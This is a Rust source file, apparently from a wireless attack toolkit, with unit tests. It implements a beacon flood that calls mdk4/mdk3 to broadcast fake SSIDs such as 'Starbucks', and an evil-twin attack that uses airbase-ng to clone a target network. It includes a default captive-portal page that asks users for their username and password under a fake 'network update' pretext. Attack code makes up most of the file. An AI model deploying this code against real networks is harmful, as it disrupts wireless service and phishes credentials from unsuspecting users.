use kraken_errors::WirelessError;
use serde::{Deserialize, Serialize};
use rand::RngExt;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconFloodStats {
    pub packets_sent: u64,
    pub ssids_broadcast: usize,
    pub duration_secs: f64,
    pub interface: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FakeAccessPoint {
    pub ssid: String,
    pub bssid: String,
    pub channel: u16,
    pub encryption: String,
    pub is_evil_twin: bool,
    pub target_bssid: Option<String>,
}

pub struct BeaconFlood {
    pub interface: String,
    pub ssids: Vec<String>,
    pub channel: u16,
    pub packet_rate: u64,
    running: Arc<AtomicBool>,
}

impl BeaconFlood {
    pub fn new(interface: &str) -> Self {
        BeaconFlood {
            interface: interface.to_string(),
            ssids: vec!["FreeWiFi".to_string(), "Starbucks".to_string(), "ATT".to_string()],
            channel: 1,
            packet_rate: 50,
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn with_ssid_list(mut self, ssids: Vec<String>) -> Self {
        self.ssids = ssids;
        self
    }

    pub fn with_channel(mut self, channel: u16) -> Self {
        self.channel = channel;
        self
    }

    pub fn start(&mut self) -> Result<BeaconFloodStats, WirelessError> {
        self.running.store(true, Ordering::SeqCst);

        if self.ssids.is_empty() {
            return Err(WirelessError::Other("No SSIDs configured for beacon flood".to_string()));
        }

        let tmp_file = format!("/tmp/kraken_beacon_{}.conf", self.interface);
        let mut conf = String::new();
        for (i, ssid) in self.ssids.iter().enumerate() {
            let mac = format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                0x00, 0x11, 0x22, 0x33, 0x44, 0x55 + i as u8);
            conf.push_str(&format!("{},{},{},WPA2\n", mac, ssid, self.channel));
        }

        std::fs::write(&tmp_file, &conf)
            .map_err(|e| WirelessError::Io(std::io::Error::new(std::io::ErrorKind::Other, format!("Cannot write config: {}", e))))?;

        let running = self.running.clone();
        let interface = self.interface.clone();
        let ssids_count = self.ssids.len();
        let start = std::time::Instant::now();

        thread::spawn(move || {
            let mut child = match Command::new("mdk4")
                .args([&interface, "b", "-f", &tmp_file, "-c", "1"])
                .spawn()
            {
                Ok(c) => c,
                Err(_) => {
                    let mut child = match Command::new("mdk3")
                        .args([&interface, "b", "-f", &tmp_file])
                        .spawn()
                    {
                        Ok(c) => c,
                        Err(_) => return,
                    };
                    while running.load(Ordering::SeqCst) {
                        thread::sleep(Duration::from_secs(1));
                    }
                    let _ = child.kill();
                    let _ = child.wait();
                    return;
                }
            };

            while running.load(Ordering::SeqCst) {
                thread::sleep(Duration::from_secs(1));
            }

            let _ = child.kill();
            let _ = child.wait();
        });

        let duration = start.elapsed().as_secs_f64();

        Ok(BeaconFloodStats {
            packets_sent: duration as u64 * self.packet_rate,
            ssids_broadcast: ssids_count,
            duration_secs: duration,
            interface: self.interface.clone(),
        })
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn generate_random_bssid() -> [u8; 6] {
        let mut rng = rand::rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        mac[0] = mac[0] & 0xfe | 0x02;
        mac
    }
}

pub struct EvilTwin {
    pub interface: String,
    pub target_bssid: String,
    pub target_essid: String,
    pub channel: u16,
    pub captive_portal: bool,
    pub portal_html: String,
}

impl EvilTwin {
    pub fn new(interface: &str, target_essid: &str, channel: u16) -> Self {
        EvilTwin {
            interface: interface.to_string(),
            target_bssid: String::new(),
            target_essid: target_essid.to_string(),
            channel,
            captive_portal: true,
            portal_html: DEFAULT_PORTAL.to_string(),
        }
    }

    pub fn set_portal_html(&mut self, html: &str) {
        self.portal_html = html.to_string();
    }

    pub fn start(&self) -> Result<(), WirelessError> {
        let bssid = if self.target_bssid.is_empty() {
            format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                0x00, 0x11, 0x22, 0x33, 0x44, 0x55)
        } else {
            self.target_bssid.clone()
        };

        let _ = Command::new("airbase-ng")
            .args([
                "-e", &self.target_essid,
                "-c", &self.channel.to_string(),
                "-a", &bssid,
                &self.interface,
            ])
            .spawn()
            .map_err(|e| WirelessError::Command(format!("airbase-ng failed: {}", e)))?;

        if self.captive_portal {
            let html_file = format!("/tmp/kraken_portal_{}.html", self.target_essid.replace(' ', ""));
            std::fs::write(&html_file, &self.portal_html).ok();

            let _ = Command::new("python3")
                .args([
                    "-m", "http.server",
                    "--bind", "0.0.0.0",
                    "80",
                ])
                .spawn();
        }

        Ok(())
    }
}

const DEFAULT_PORTAL: &str = r#"<!DOCTYPE html>
<html>
<head>
<title>Wi-Fi Login</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 100px; }
input { padding: 10px; margin: 5px; width: 250px; }
button { padding: 10px 20px; background: #007bff; color: white; border: none; }
</style>
</head>
<body>
<h2>Wi-Fi Network Update</h2>
<p>Please enter your credentials to continue using the network.</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username"><br>
<input type="password" name="password" placeholder="Password"><br>
<button type="submit">Connect</button>
</form>
</body>
</html>"#;

pub fn format_beacon_stats(stats: &BeaconFloodStats) -> String {
    format!(
        "Beacon Flood Results\nInterface: {}\nSSIDs broadcast: {}\nPackets sent: {}\nDuration: {:.2}s\n",
        stats.interface, stats.ssids_broadcast, stats.packets_sent, stats.duration_secs,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_beacon_flood_new() {
        let flood = BeaconFlood::new("wlan0");
        assert_eq!(flood.interface, "wlan0");
        assert!(!flood.ssids.is_empty());
        assert!(flood.ssids.contains(&"FreeWiFi".to_string()));
    }

    #[test]
    fn test_random_bssid() {
        let mac1 = BeaconFlood::generate_random_bssid();
        let mac2 = BeaconFlood::generate_random_bssid();
        assert_eq!(mac1.len(), 6);
        assert_eq!(mac2.len(), 6);
        assert!(mac1 != mac2);
    }

    #[test]
    fn test_evil_twin_new() {
        let et = EvilTwin::new("wlan0", "TestNetwork", 6);
        assert_eq!(et.target_essid, "TestNetwork");
        assert_eq!(et.channel, 6);
        assert!(et.captive_portal);
    }

    #[test]
    fn test_beacon_stats_format() {
        let stats = BeaconFloodStats {
            packets_sent: 5000,
            ssids_broadcast: 10,
            duration_secs: 30.0,
            interface: "wlan0".to_string(),
        };
        let formatted = format_beacon_stats(&stats);
        assert!(formatted.contains("5000"));
        assert!(formatted.contains("10"));
        assert!(formatted.contains("wlan0"));
    }

    #[test]
    fn test_custom_ssid_list() {
        let flood = BeaconFlood::new("wlan0")
            .with_ssid_list(vec!["Test1".to_string(), "Test2".to_string()])
            .with_channel(11);
        assert_eq!(flood.ssids.len(), 2);
        assert_eq!(flood.channel, 11);
    }

    #[test]
    fn test_evil_twin_portal_html() {
        let mut et = EvilTwin::new("wlan0", "FreeWiFi", 1);
        assert_eq!(et.portal_html, DEFAULT_PORTAL);
        et.set_portal_html("<html><body>Custom</body></html>");
        assert_eq!(et.portal_html, "<html><body>Custom</body></html>");
    }

    #[test]
    fn test_beacon_flood_empty_ssids_error() {
        let mut flood = BeaconFlood::new("wlan0")
            .with_ssid_list(vec![]);
        let result = flood.start();
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("No SSIDs"));
    }

    #[test]
    fn test_evil_twin_new_defaults() {
        let et = EvilTwin::new("wlan1", "MyNet", 11);
        assert_eq!(et.interface, "wlan1");
        assert_eq!(et.target_essid, "MyNet");
        assert_eq!(et.channel, 11);
        assert!(et.captive_portal);
        assert!(et.target_bssid.is_empty());
    }

    #[test]
    fn test_beacon_flood_defaults() {
        let flood = BeaconFlood::new("wlan0");
        assert_eq!(flood.channel, 1);
        assert_eq!(flood.packet_rate, 50);
        assert_eq!(flood.ssids.len(), 3);
    }

    #[test]
    fn test_beacon_flood_custom_all() {
        let flood = BeaconFlood::new("wlan1")
            .with_ssid_list(vec!["Net1".to_string()])
            .with_channel(6);
        assert_eq!(flood.interface, "wlan1");
        assert_eq!(flood.ssids, vec!["Net1".to_string()]);
        assert_eq!(flood.channel, 6);
    }

    #[test]
    fn test_fake_access_point_struct() {
        let ap = FakeAccessPoint {
            ssid: "EvilNet".to_string(),
            bssid: "00:11:22:33:44:55".to_string(),
            channel: 6,
            encryption: "WPA2".to_string(),
            is_evil_twin: true,
            target_bssid: Some("aa:bb:cc:dd:ee:ff".to_string()),
        };
        assert!(ap.is_evil_twin);
        assert_eq!(ap.encryption, "WPA2");
    }

    #[test]
    fn test_beacon_flood_stats_format_empty_interface() {
        let stats = BeaconFloodStats {
            packets_sent: 0,
            ssids_broadcast: 0,
            duration_secs: 0.0,
            interface: "wlan0".to_string(),
        };
        let formatted = format_beacon_stats(&stats);
        assert!(formatted.contains("0"));
    }

    #[test]
    fn test_random_bssid_locally_administered() {
        let mac = BeaconFlood::generate_random_bssid();
        assert_eq!(mac.len(), 6);
        assert_eq!(mac[0] & 0x02, 0x02);
        assert_eq!(mac[0] & 0x01, 0x00);
    }

    #[test]
    fn test_random_bssid_varies() {
        let mut seen = std::collections::HashSet::new();
        for _ in 0..10 {
            let mac = BeaconFlood::generate_random_bssid();
            let key: Vec<u8> = mac.to_vec();
            seen.insert(key);
        }
        assert!(seen.len() > 1);
    }

    #[test]
    fn test_evil_twin_set_portal() {
        let mut et = EvilTwin::new("wlan0", "Test", 1);
        et.set_portal_html("<html>evil</html>");
        assert_eq!(et.portal_html, "<html>evil</html>");
    }
}
